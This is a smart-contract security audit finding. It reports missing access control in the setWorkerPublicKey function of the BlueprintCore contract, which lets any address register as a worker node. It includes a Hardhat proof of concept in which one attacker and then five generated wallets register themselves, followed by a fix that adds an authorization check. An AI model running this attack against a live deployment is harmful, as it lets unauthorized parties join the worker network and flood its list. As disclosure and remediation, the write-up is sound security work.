Feisty Pickle Liger

High

# Unauthorized Users Can Register as Worker Nodes Due to Missing Access Controls in the `setWorkerPublicKey` Function

### Summary

Unauthorized users can register as worker nodes due to missing access controls in `setWorkerPublicKey` function in the `BlueprinCore.sol` contract.

### Root Cause

The vulnerability stems from a lack of access control in the `setWorkerPublicKey` function. This function allows any address to register as a worker node without verification or authorization checks. The implementation only checks if the address has already registered a public key, but does not validate whether the caller has permission to become a worker node.

[crestal-omni-contracts/src/BlueprintCore.sol:setWorkerPublicKey#L688-L695](https://github.com/sherlock-audit/2025-03-crestal-network/blob/27a3c28155702b3a68f29347efedffb048010e33/crestal-omni-contracts/src/BlueprintCore.sol#L688C1-L695C6)
```solidity
function setWorkerPublicKey(bytes calldata publicKey) public {
    if (workersPublicKey[msg.sender].length == 0) {
        workerAddressesMp[WORKER_ADDRESS_KEY].push(msg.sender);
    }

    workersPublicKey[msg.sender] = publicKey;
}
```

### Internal Pre-conditions

1. The `setWorkerPublicKey` function is publicly accessible
2. No additional access control modifiers (such as `onlyOwner` or `onlyAdmin`) are applied to the function

### External Pre-conditions

The attacker can set worker node by the `setWorkerPublickey` function.

### Attack Path

An attacker can exploit this vulnerability through the following steps:

1. Generate any arbitrary bytes to use as a "public key"
2. Call the `setWorkerPublicKey` function with the generated bytes
3. The function will execute without any authorization checks
4. The attacker's address is added to the worker address list (`workerAddressesMp[WORKER_ADDRESS_KEY]`)
5. The attacker's public key is stored in the `workersPublicKey` mapping

### Impact

The successful exploitation of this vulnerability could result in:

1. **Unauthorized Worker Registration**: Malicious actors can register as worker nodes without permission
2. **Denial of Service**: A large number of fake workers could bloat the system's worker list

### PoC

This PoC demonstrates a critical security vulnerability in the BlueprintCore contract that allows any user to register as a worker node without authorization. It consists of two test cases:
- Basic Vulnerability Demonstration: Shows how an unauthorized user can register as a worker
- Mass Registration Attack: Demonstrates how multiple attackers can flood the worker list

<details><summary>POC</summary>

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("BlueprintCore Worker Registration Vulnerability", function () {
  let blueprintCore;
  let owner;
  let attacker;

  beforeEach(async function () {
    // Get signers
    [owner, attacker] = await ethers.getSigners();
    
    // Deploy BlueprintCore contract
    const BlueprintCoreFactory = await ethers.getContractFactory("BlueprintCore");
    blueprintCore = await BlueprintCoreFactory.connect(owner).deploy();
    await blueprintCore.deployed();
    
    console.log("Contract deployed by:", owner.address);
    console.log("Attacker address:", attacker.address);
  });

  it("Allows any user to register as a worker node without authorization", async function () {
    // GIVEN: Check initial state - attacker should not be a worker
    const initialWorkers = await blueprintCore.getWorkerAddresses();
    console.log("Initial worker count:", initialWorkers.length);
    
    const isInitiallyWorker = initialWorkers.some(addr => 
      addr.toLowerCase() === attacker.address.toLowerCase()
    );
    expect(isInitiallyWorker).to.be.false;
    console.log("Attacker is initially a worker:", isInitiallyWorker);
    
    // WHEN: Attacker calls setWorkerPublicKey with arbitrary data
    console.log("\nExecuting attack...");
    const maliciousPublicKey = ethers.utils.toUtf8Bytes("MALICIOUS_WORKER_KEY");
    
    const tx = await blueprintCore.connect(attacker).setWorkerPublicKey(maliciousPublicKey);
    await tx.wait();
    console.log("Transaction hash:", tx.hash);
    
    // THEN: Verify attacker is now registered as a worker
    const updatedWorkers = await blueprintCore.getWorkerAddresses();
    console.log("\nUpdated worker count:", updatedWorkers.length);
    
    const isNowWorker = updatedWorkers.some(addr => 
      addr.toLowerCase() === attacker.address.toLowerCase()
    );
    expect(isNowWorker).to.be.true;
    console.log("Attacker is now a worker:", isNowWorker);
    
    // AND: Verify the attacker's public key was stored correctly
    const storedKey = await blueprintCore.workersPublicKey(attacker.address);
    const storedKeyString = ethers.utils.toUtf8String(storedKey);
    console.log("Stored public key:", storedKeyString);
    
    expect(storedKeyString).to.equal("MALICIOUS_WORKER_KEY");
    
    console.log("\nVULNERABILITY CONFIRMED: Unauthorized user successfully registered as worker");
    console.log("Security impact: Malicious actors can join the worker network without permission");
  });
  
  it("Demonstrates potential impact - multiple attackers can flood worker list", async function () {
    // Create multiple attacker accounts
    const attackerCount = 5;
    const attackers = [];
    
    for (let i = 0; i < attackerCount; i++) {
      const wallet = ethers.Wallet.createRandom().connect(ethers.provider);
      
      // Fund the wallet with ETH for gas
      await owner.sendTransaction({
        to: wallet.address,
        value: ethers.utils.parseEther("1.0")
      });
      
      attackers.push(wallet);
    }
    
    console.log(`Created ${attackerCount} attacker wallets`);
    
    // Get initial worker count
    const initialWorkers = await blueprintCore.getWorkerAddresses();
    console.log("Initial worker count:", initialWorkers.length);
    
    // All attackers register as workers
    console.log("\nExecuting mass registration attack...");
    
    for (let i = 0; i < attackerCount; i++) {
      const maliciousKey = ethers.utils.toUtf8Bytes(`ATTACKER_${i}_KEY`);
      await blueprintCore.connect(attackers[i]).setWorkerPublicKey(maliciousKey);
      console.log(`Attacker ${i} registered as worker`);
    }
    
    // Verify worker list has grown
    const updatedWorkers = await blueprintCore.getWorkerAddresses();
    console.log("\nUpdated worker count:", updatedWorkers.length);
    expect(updatedWorkers.length).to.equal(initialWorkers.length + attackerCount);
    
    console.log("\nVULNERABILITY IMPACT DEMONSTRATED: Multiple attackers can flood the worker list");
    console.log("This could lead to resource exhaustion or compromise the worker selection mechanism");
  });
});
```

</details>

### Mitigation

To address this vulnerability, it is recommended to implement proper access control for worker registration and add authorization checks.

```solidity
+    mapping(address => bool) public authorizedWorkers;

+    function authorizeWorker(address worker) public onlyOwner {
+   	authorizedWorkers[worker] = true;
+    	emit WorkerAuthorized(worker);
+	}

+    function isAuthorizedWorker(address worker) public view returns (bool) {
+    	return authorizedWorkers[worker];
+    }

function setWorkerPublicKey(bytes calldata publicKey) public {
+    require(isAuthorizedWorker(msg.sender), "Not authorized to register as worker");
    
    if (workersPublicKey[msg.sender].length == 0) {
        workerAddressesMp[WORKER_ADDRESS_KEY].push(msg.sender);
    }

    workersPublicKey[msg.sender] = publicKey;
    
    emit WorkerRegistered(msg.sender);
}
```